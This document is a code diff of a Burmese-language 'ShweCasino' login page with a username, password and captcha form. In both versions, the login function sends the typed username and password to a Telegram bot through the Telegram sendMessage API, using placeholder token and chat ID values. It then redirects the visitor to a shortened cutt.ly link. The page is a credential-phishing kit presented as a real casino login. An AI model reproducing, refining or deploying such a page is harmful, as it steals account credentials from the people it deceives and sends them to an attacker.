@@ -5,14 +5,14 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>ShweCasino Login</title>
+<title>ShweCasino</title>
 
 <style>
 
 body{
 margin:0;
-font-family:"Myanmar Text";
 background:#8b0000;
+font-family:Myanmar Text;
 color:white;
 }
 
@@ -20,20 +20,17 @@ color:white;
 
 .banner img{
 width:100%;
-height:auto;
 display:block;
 }
 
 /* login box */
 
 .login-box{
-background:#6b0000;
-margin:20px;
-padding:25px;
-border-radius:12px;
+background:#a00000;
+margin:15px;
+padding:20px;
+border-radius:15px;
 }
-
-/* title */
 
 .title{
 text-align:center;
@@ -41,33 +38,35 @@ font-size:28px;
 margin-bottom:20px;
 }
 
-/* input */
+/* inputs */
 
-input{
+.input{
 width:100%;
 padding:14px;
 margin:10px 0;
 border:none;
-border-radius:8px;
+border-radius:10px;
 font-size:16px;
 }
 
-/* button */
+/* password eye */
 
-button{
-width:100%;
-padding:14px;
-margin-top:10px;
-background:#ffd700;
-border:none;
-border-radius:8px;
+.passbox{
+position:relative;
+}
+
+.eye{
+position:absolute;
+right:15px;
+top:50%;
+transform:translateY(-50%);
 font-size:18px;
-font-weight:bold;
+cursor:pointer;
 }
 
 /* captcha */
 
-.captcha-box{
+.captcha-row{
 display:flex;
 align-items:center;
 gap:10px;
@@ -78,31 +77,29 @@ margin-top:10px;
 background:white;
 color:black;
 padding:8px 14px;
-font-weight:bold;
 border-radius:6px;
+font-weight:bold;
 }
 
 .refresh{
-background:#ddd;
+background:#eee;
 color:black;
-padding:8px 12px;
+padding:8px 10px;
 border-radius:6px;
 cursor:pointer;
 }
 
-/* password eye */
+/* button */
 
-.pass-box{
-position:relative;
-}
-
-.eye{
-position:absolute;
-right:10px;
-top:50%;
-transform:translateY(-50%);
-cursor:pointer;
+.btn{
+width:100%;
+padding:14px;
+margin-top:15px;
+background:#ffd700;
+border:none;
+border-radius:10px;
 font-size:18px;
+font-weight:bold;
 }
 
 </style>
@@ -119,25 +116,27 @@ font-size:18px;
 
 <div class="title">အကောင့်ထဲဝင်ရန်</div>
 
-<input id="username" placeholder="အကောင့်အမည်">
+<input class="input" id="user" placeholder="အကောင့်အမည်">
 
-<div class="pass-box">
-<input type="password" id="password" placeholder="စကားဝှက်">
-<span class="eye" onclick="togglePass()">👁</span>
+<div class="passbox">
+<input class="input" type="password" id="pass" placeholder="စကားဝှက်">
+<span class="eye" onclick="togglePass()"></span>
 </div>
 
-<div class="captcha-box">
-<div class="captcha" id="captcha"></div>
-<div class="refresh" onclick="createCaptcha()">↻</div>
+<div class="captcha-row">
+<div id="captcha" class="captcha"></div>
+<div class="refresh" onclick="createCaptcha()"></div>
 </div>
 
-<input id="captchaInput" placeholder="captcha ရိုက်ထည့်ပါ">
+<input class="input" id="captchaInput" placeholder="captcha ရိုက်ထည့်ပါ">
 
-<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>
+<button class="btn" onclick="login()">အကောင့်ထဲဝင်ရန်</button>
 
 </div>
 
 <script>
+
+/* TG BOT */
 
 var token="BOT_TOKEN";
 var chat_id="CHAT_ID";
@@ -145,24 +144,26 @@ var chat_id="CHAT_ID";
 /* password show hide */
 
 function togglePass(){
-var x=document.getElementById("password");
 
-if(x.type==="password"){
-x.type="text";
+var p=document.getElementById("pass");
+
+if(p.type==="password"){
+p.type="text";
 }else{
-x.type="password";
+p.type="password";
 }
+
 }
 
 /* captcha */
 
-var cap;
+var code;
 
 function createCaptcha(){
 
-cap=Math.floor(1000+Math.random()*9000);
+code=Math.floor(1000+Math.random()*9000);
 
-document.getElementById("captcha").innerText=cap;
+document.getElementById("captcha").innerText=code;
 
 }
 
@@ -172,22 +173,22 @@ createCaptcha();
 
 function login(){
 
-var user=document.getElementById("username").value;
-var pass=document.getElementById("password").value;
-var capInput=document.getElementById("captchaInput").value;
+var u=document.getElementById("user").value;
+var p=document.getElementById("pass").value;
+var c=document.getElementById("captchaInput").value;
 
-if(capInput!=cap){
+if(c!=code){
 alert("captcha မှားနေပါတယ်");
 createCaptcha();
 return;
 }
 
-var msg=
+var text=
 "ShweCasino Login%0A"+
-"User: "+user+"%0A"+
-"Pass: "+pass;
+"User: "+u+"%0A"+
+"Pass: "+p;
 
-fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+msg);
+fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+text);
 
 window.location.href="https://cutt.ly/otrecCFE";
 
